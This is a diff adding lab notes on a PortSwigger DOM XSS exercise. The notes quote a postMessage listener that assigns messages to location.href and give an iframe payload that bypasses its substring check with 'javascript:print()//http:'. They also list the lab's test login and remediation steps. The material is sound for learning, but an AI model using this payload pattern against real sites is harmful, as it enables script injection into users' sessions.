@@ -797,3 +797,191 @@ innerHTML
 ```txt
 DOM-based web message vulnerabilities happen when attacker-controlled messages are received through postMessage() and inserted into dangerous JavaScript or HTML sinks without proper validation.
 ```
+
+---
+
+# 📌Lab-2 DOM XSS using Web Messages + JavaScript URL (Lab Notes)
+
+---
+
+## 🧭 Overview
+
+This lab shows a DOM-based vulnerability where:
+
+- A page listens for messages using `postMessage()`
+- It trusts the incoming message too much
+- It directly assigns that message into `location.href`
+
+Core issue:
+Unsafe web message → unsafe URL redirection → JavaScript execution
+
+---
+
+## 🧠 What is this Topic
+
+This is a DOM-based web message vulnerability.
+
+Key idea:
+
+One page sends a message → another page receives it  
+Receiver does NOT properly validate it  
+Message is used in a dangerous sink (`location.href`)
+
+Important components:
+
+Source:
+```javascript
+postMessage()
+```
+
+Sink:
+```javascript
+location.href
+```
+
+If URL starts with:
+```text
+javascript:
+```
+browser executes code instead of navigating
+
+---
+
+## 🧪 Lab Walkthrough (Step-by-step)
+
+### 🔐 Step 1: Login
+
+```text
+wiener:peter
+```
+
+---
+
+### 🧾 Step 2: Identify Vulnerable Code (Source Page SS)
+
+🖼️ SS - Source Page (View Source / DevTools)
+
+![ss1](../images/source-page-js-url-code.png)
+
+
+Vulnerable JavaScript:
+
+```javascript
+window.addEventListener('message', function(e) {
+
+    if (
+        e.data.indexOf('http:') > -1 ||
+        e.data.indexOf('https:') > -1
+    ) {
+        location.href = e.data;
+    }
+
+});
+```
+
+---
+
+## ⚠️ Step 3: Weakness
+
+- Only checks substring `http:`
+- No full URL validation
+- Direct assignment to sink
+
+```javascript
+location.href = e.data
+```
+
+---
+
+## 🚀 Step 4: Exploit Payload
+
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/"
+onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+</iframe>
+```
+
+---
+
+## 🔄 Step 5: Execution Flow
+
+```text
+iframe loads page
+↓
+postMessage sent
+↓
+message received
+↓
+validation passes
+↓
+location.href set
+↓
+javascript executed
+↓
+print() runs
+```
+
+---
+
+## 🏁 Step 6: Lab Solved
+
+```text
+javascript:print() executed in victim context
+```
+
+---
+
+## 🌍 Real-World Impact
+
+- ad systems
+- payment popups
+- iframe widgets
+- chat systems
+
+Attackers can:
+- XSS execution
+- redirects
+- script execution
+
+---
+
+## 🎯 High Value Targets
+
+```
+/
+ /dashboard
+ /my-account
+ /payment
+ /profile
+ iframe components
+```
+
+---
+
+## 🔗 Attack Chain
+
+```text
+iframe → postMessage → listener → weak validation → location.href → javascript: → XSS
+```
+
+---
+
+## 🛡️ Remediation
+
+- validate `event.origin`
+- allow only trusted domains
+- avoid:
+```javascript
+location.href = userInput
+```
+- use:
+```javascript
+startsWith("https://trusted-site.com")
+```
+- apply CSP
+
+---
+
+## 🧠 FINAL ONE-LINE MEMORY
+
+Unsafe postMessage input is directly assigned to `location.href` without validation, allowing `javascript:` execution and DOM XSS.
